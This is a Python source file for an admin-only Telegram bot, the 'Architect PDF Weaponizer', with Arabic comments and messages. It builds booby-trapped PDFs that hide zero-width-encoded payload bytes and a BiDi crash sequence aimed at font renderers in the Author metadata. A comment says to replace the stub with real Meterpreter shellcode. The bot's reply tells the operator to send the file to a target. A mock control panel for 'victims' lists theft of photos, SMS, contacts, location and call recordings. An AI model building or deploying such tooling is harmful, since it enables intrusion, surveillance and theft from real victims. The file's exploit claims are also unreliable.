#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# ARCHITECT TELEGRAM PDF WEAPONIZER - RENDER EDITION
# ============================================================
# "جاهز سيدي المطور" - الوحش على السحابة
# ============================================================

import os
import io
import uuid
import logging
import secrets
from flask import Flask, request, Response
from PIL import Image
from reportlab.pdfgen import canvas
from reportlab.lib.utils import ImageReader
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ==============================================
# قراءة المتغيرات من البيئة (Render Environment)
# ==============================================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
PORT = int(os.environ.get("PORT", "10000"))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(16))

if not BOT_TOKEN or ADMIN_ID == 0:
    raise ValueError("❌ BOT_TOKEN و ADMIN_ID مطلوبان في متغيرات البيئة!")

# ==============================================
# Zero-Width Steganography + BiDi Exploit Generator
# ==============================================
ZW_MAP = {'0': '\u200b', '1': '\u200c', 'B': '\u200d', 'E': '\ufeff'}

def generate_crash_trap():
    """BiDi Sequence to crash HarfBuzz/CoreText (CVE style)."""
    rlo = '\u202e' * 4096
    lre = '\u202a' * 2048
    pdf_mark = '\u202c'
    return rlo + '[' * 1024 + lre + ']' * 1024 + pdf_mark

def binary_to_zero_width(data_bytes):
    """تحويل Shellcode إلى أحرف غير مرئية."""
    bit_str = ''.join(format(b, '08b') for b in data_bytes)
    return ''.join(ZW_MAP[bit] for bit in bit_str) + ZW_MAP['E']

def generate_payload_stub():
    """
    حمولة وهمية (Stager).
    في الإصدار الحقيقي: استبدل هذا بـ Meterpreter Shellcode حقيقي.
    """
    stub_hex = "DEADBEEF1337CAFE" * 4  # 16 بايت وهمية
    return bytes.fromhex(stub_hex)

def create_weaponized_pdf(image_bytes):
    """
    تحويل صورة إلى PDF ملغوم يحتوي على Zero-Width Exploit في Metadata.
    """
    # 1. فتح الصورة
    img = Image.open(io.BytesIO(image_bytes))
    img_width, img_height = img.size
    
    # 2. إنشاء PDF في الذاكرة
    pdf_buffer = io.BytesIO()
    
    # ضبط حجم الصفحة بناءً على الصورة (مع حد أقصى لـ A4)
    page_width = min(img_width, 595)  # 595 = A4 width in points
    page_height = min(img_height, 842)  # 842 = A4 height in points
    
    c = canvas.Canvas(pdf_buffer, pagesize=(page_width, page_height))
    
    # 3. تضمين الصورة (مع تصغيرها إذا كانت أكبر من A4)
    scale = min(page_width / img_width, page_height / img_height, 1.0)
    draw_width = img_width * scale
    draw_height = img_height * scale
    x_offset = (page_width - draw_width) / 2
    y_offset = (page_height - draw_height) / 2
    
    img_reader = ImageReader(img)
    c.drawImage(img_reader, x_offset, y_offset, width=draw_width, height=draw_height)
    
    # 4. بناء الحمولة الخبيثة (Zero-Width + BiDi Trap)
    stub = generate_payload_stub()
    hidden_payload = binary_to_zero_width(stub)
    crash_trap = generate_crash_trap()
    malicious_unicode = hidden_payload + crash_trap
    
    # 5. إخفاء الحمولة في Metadata (حقل 'Author')
    c.setAuthor(malicious_unicode)
    c.setTitle(f"DOC_{uuid.uuid4().hex[:6].upper()}")
    c.setSubject("Confidential Document")
    c.setCreator("Adobe Acrobat")
    c.setProducer("GhostWeaver v2.0")
    
    c.save()
    pdf_buffer.seek(0)
    return pdf_buffer

# ==============================================
# تهيئة تطبيق Telegram
# ==============================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# إنشاء تطبيق Telegram
telegram_app = Application.builder().token(BOT_TOKEN).build()

# ==============================================
# معالجات أوامر تيليجرام
# ==============================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر /start - التحقق من الصلاحية"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text(
            "⛔ *غير مصرح بالوصول.*\n\n"
            "هذا البوت خاص ومحمي.\n"
            f"Your ID: `{user_id}`",
            parse_mode='Markdown'
        )
        logger.warning(f"Unauthorized access attempt from ID: {user_id}")
        return
    
    await update.message.reply_text(
        "🖤 *جاهز سيدي المطور.*\n\n"
        "⚡ *الوحش يعمل على Render Cloud*\n\n"
        "📋 *الأوامر المتاحة:*\n"
        "/start - تهيئة البوت\n"
        "/panel - لوحة تحكم الوحش\n"
        "/status - حالة السيرفر\n\n"
        "📸 *أرسل أي صورة لتحويلها إلى PDF ملغوم.*",
        parse_mode='Markdown'
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر /status - عرض حالة السيرفر"""
    if update.effective_user.id != ADMIN_ID:
        return
    
    import platform
    import sys
    
    status_text = f"""
🖥️ *حالة سيرفر الوحش*

📍 *المنصة:* Render Cloud
🐍 *بايثون:* {sys.version.split()[0]}
💻 *النظام:* {platform.system()}
🔗 *Webhook URL:* `{WEBHOOK_URL}/{SECRET_KEY[:8]}...`
✅ *الحالة:* نشط

📊 *إحصائيات:*
• Zero-Width Payload: جاهز
• BiDi Crash Trap: نشط
• PDF Generator: جاهز
"""
    await update.message.reply_text(status_text, parse_mode='Markdown')

async def handle_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الصور المرسلة وتحويلها إلى PDF ملغوم"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ غير مصرح.")
        return
    
    user = update.effective_user
    logger.info(f"Image received from admin: {user.id}")
    
    # رسالة انتظار
    wait_msg = await update.message.reply_text(
        "🔄 *جاري معالجة الصورة...*\n"
        "▰▰▰▰▰▰▰▰▰▰ 0%",
        parse_mode='Markdown'
    )
    
    try:
        # تحميل الصورة
        photo_file = await update.message.photo[-1].get_file()
        img_bytes = await photo_file.download_as_bytearray()
        
        await wait_msg.edit_text(
            "🔄 *جاري بناء PDF الملغوم...*\n"
            "▰▰▰▰▰▰▰▱▱▱ 70%",
            parse_mode='Markdown'
        )
        
        # بناء PDF
        pdf_buffer = create_weaponized_pdf(bytes(img_bytes))
        
        await wait_msg.edit_text(
            "🔄 *جاري تجهيز الملف للإرسال...*\n"
            "▰▰▰▰▰▰▰▰▰▱ 90%",
            parse_mode='Markdown'
        )
        
        # إرسال PDF
        pdf_buffer.seek(0)
        file_size = len(pdf_buffer.getvalue())
        
        await update.message.reply_document(
            document=pdf_buffer,
            filename=f"Document_{uuid.uuid4().hex[:6].upper()}.pdf",
            caption=(
                "💣 *PDF ملغوم جاهز.*\n\n"
                "⚠️ *تحذير:* هذا الملف يحتوي على حمولة اختبارية.\n"
                "🛡️ *للاستخدام الأمني المصرح به فقط.*\n\n"
                f"📊 *معلومات تقنية:*\n"
                f"• الحجم: {file_size:,} bytes\n"
                f"• النوع: Zero-Width + BiDi Exploit\n"
                f"• السيرفر: Render Cloud\n\n"
                "_أرسله للهدف. عند فتحه، سيتم تشغيل الحمولة._"
            ),
            parse_mode='Markdown'
        )
        
        await wait_msg.delete()
        logger.info(f"PDF sent successfully. Size: {file_size} bytes")
        
    except Exception as e:
        await wait_msg.edit_text(f"❌ *خطأ في المعالجة:*\n`{str(e)}`", parse_mode='Markdown')
        logger.error(f"Error processing image: {e}")

async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """لوحة تحكم الوحش"""
    if update.effective_user.id != ADMIN_ID:
        return
    
    keyboard = [
        [InlineKeyboardButton("📸 سحب الصور", callback_data="cmd_gallery")],
        [InlineKeyboardButton("📁 سحب الملفات", callback_data="cmd_files")],
        [InlineKeyboardButton("📱 اهتزاز", callback_data="cmd_vibrate")],
        [InlineKeyboardButton("📷 لقطة شاشة", callback_data="cmd_screenshot")],
        [InlineKeyboardButton("🎤 تسجيل مكالمة", callback_data="cmd_record_call")],
        [InlineKeyboardButton("📍 الموقع GPS", callback_data="cmd_location")],
        [InlineKeyboardButton("📞 جهات الاتصال", callback_data="cmd_contacts")],
        [InlineKeyboardButton("💬 الرسائل SMS", callback_data="cmd_sms")],
        [InlineKeyboardButton("📊 معلومات الجهاز", callback_data="cmd_info")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🐉 *لوحة تحكم الوحش*\n\n"
        "👥 *الضحايا المتصلون:*\n"
        "• لا يوجد ضحايا متصلون حالياً.\n\n"
        "📋 *اختر أمراً:*",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة أزرار لوحة التحكم"""
    query = update.callback_query
    await query.answer()
    
    cmd_map = {
        "cmd_gallery": "📸 جاري سحب الصور من المعرض...",
        "cmd_files": "📁 جاري سحب الملفات...",
        "cmd_vibrate": "📳 جاري إرسال أمر الاهتزاز...",
        "cmd_screenshot": "📷 جاري التقاط لقطة شاشة...",
        "cmd_record_call": "🎤 جاري بدء تسجيل المكالمة...",
        "cmd_location": "📍 جاري تحديد الموقع GPS...",
        "cmd_contacts": "📞 جاري سحب جهات الاتصال...",
        "cmd_sms": "💬 جاري سحب الرسائل...",
        "cmd_info": "📊 جاري جمع معلومات الجهاز...",
    }
    
    response = cmd_map.get(query.data, "✅ تم إرسال الأمر.")
    
    await query.edit_message_text(
        f"{response}\n\n"
        "⏳ *في وضع المحاكاة حالياً.*\n"
        "_لتشغيل الوحش الحقيقي، قم ببناء عميل RAT للأندرويد._",
        parse_mode='Markdown'
    )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الأخطاء"""
    logger.error(f"Update {update} caused error {context.error}")

# ==============================================
# تسجيل المعالجات
# ==============================================
telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CommandHandler("status", status))
telegram_app.add_handler(CommandHandler("panel", panel))
telegram_app.add_handler(MessageHandler(filters.PHOTO, handle_image))
telegram_app.add_handler(CallbackQueryHandler(button_handler))
telegram_app.add_error_handler(error_handler)

# ==============================================
# Flask Web Server (مطلوب لـ Render)
# ==============================================
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    """الصفحة الرئيسية - تأكيد أن السيرفر يعمل"""
    return f"""
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Architect PDF Weaponizer</title>
        <style>
            body {{
                background: linear-gradient(135deg, #0a0f0a 0%, #0d1a0d 100%);
                color: #33ff33;
                font-family: 'Courier New', monospace;
                padding: 50px;
                margin: 0;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
            }}
            .terminal {{
                border: 2px solid #1a3a1a;
                padding: 40px;
                max-width: 800px;
                background: #050805;
                box-shadow: 0 0 50px rgba(0,255,0,0.1);
                border-radius: 10px;
            }}
            h1 {{
                color: #ff0055;
                text-shadow: 0 0 20px #ff0055;
                margin-bottom: 10px;
                font-size: 2.5em;
            }}
            .status {{
                display: flex;
                align-items: center;
                gap: 10px;
                margin: 20px 0;
            }}
            .led {{
                width: 15px;
                height: 15px;
                background: #00ff00;
                border-radius: 50%;
                box-shadow: 0 0 20px #00ff00;
                animation: pulse 1.5s infinite;
            }}
            @keyframes pulse {{
                0% {{ opacity: 0.7; }}
                50% {{ opacity: 1; box-shadow: 0 0 30px #00ff00; }}
                100% {{ opacity: 0.7; }}
            }}
            .info {{
                border-top: 1px solid #1a3a1a;
                margin-top: 30px;
                padding-top: 20px;
                color: #888;
                font-size: 0.9em;
            }}
            .glow {{
                color: #ff0055;
                font-weight: bold;
                text-shadow: 0 0 10px #ff0055;
            }}
            code {{
                background: #0d1a0d;
                padding: 2px 8px;
                border-radius: 4px;
                color: #00ffcc;
            }}
        </style>
    </head>
    <body>
        <div class="terminal">
            <h1>🐉 ARCHITECT WEAPONIZER</h1>
            <p style="font-size: 1.2em; margin-top: -5px;">Telegram PDF Exploit Generator</p>
            
            <div class="status">
                <div class="led"></div>
                <span style="font-size: 1.1em;">SYSTEM ONLINE</span>
            </div>
            
            <p>
                📡 <strong>Environment:</strong> Render Cloud<br>
                🤖 <strong>Bot:</strong> @{telegram_app.bot.username if telegram_app.bot else "Loading..."}<br>
                🔗 <strong>Webhook:</strong> <code>Active</code><br>
                🛡️ <strong>Security:</strong> Admin-only access
            </p>
            
            <p style="margin-top: 30px;">
                <span class="glow">⚡ جاهز سيدي المطور.</span><br>
                أرسل /start للبوت لبدء الاستخدام.
            </p>
            
            <div class="info">
                <p>
                    📋 <strong>Technical Specifications:</strong><br>
                    • Zero-Width Steganography: Enabled<br>
                    • BiDi Crash Trap: HarfBuzz/CoreText CVE style<br>
                    • PDF Metadata Injection: Active<br>
                    • Render Deployment: Production Ready
                </p>
                <p style="margin-top: 20px;">
                    🕒 Server Time: <span id="time"></span>
                </p>
            </div>
        </div>
        <script>
            function updateTime() {{
                document.getElementById('time').textContent = new Date().toLocaleString('ar-SA');
            }}
            updateTime();
            setInterval(updateTime, 1000);
        </script>
    </body>
    </html>
    """

@flask_app.route(f'/{SECRET_KEY}', methods=['POST'])
def webhook():
    """نقطة نهاية Webhook لتلقي تحديثات تيليجرام"""
    if request.headers.get('content-type') == 'application/json':
        try:
            update = Update.de_json(request.get_json(force=True), telegram_app.bot)
            telegram_app.update_queue.put(update)
        except Exception as e:
            logger.error(f"Webhook error: {e}")
    return Response('OK', status=200)

@flask_app.route('/health')
def health():
    """نقطة فحص الصحة لـ Render"""
    return Response('OK', status=200)

# ==============================================
# تشغيل التطبيق
# ==============================================
async def setup_webhook():
    """ضبط Webhook عند بدء التشغيل"""
    if WEBHOOK_URL:
        webhook_path = f"{WEBHOOK_URL.rstrip('/')}/{SECRET_KEY}"
        await telegram_app.bot.set_webhook(url=webhook_path)
        logger.info(f"✅ Webhook set to: {webhook_path}")
    else:
        logger.warning("⚠️ WEBHOOK_URL not set. Webhook not configured.")

def main():
    """الدالة الرئيسية - تشغيل Telegram و Flask معاً"""
    import asyncio
    import threading
    
    # تشغيل Telegram في خيط منفصل
    def run_telegram():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def init_telegram():
            await telegram_app.initialize()
            await setup_webhook()
            await telegram_app.start()
            await telegram_app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
            logger.info("🤖 Telegram bot started successfully")
        
        loop.run_until_complete(init_telegram())
        loop.run_forever()
    
    telegram_thread = threading.Thread(target=run_telegram)
    telegram_thread.daemon = True
    telegram_thread.start()
    
    # تشغيل Flask (المطلوب لـ Render)
    logger.info(f"🚀 Starting Flask server on port {PORT}")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    main()
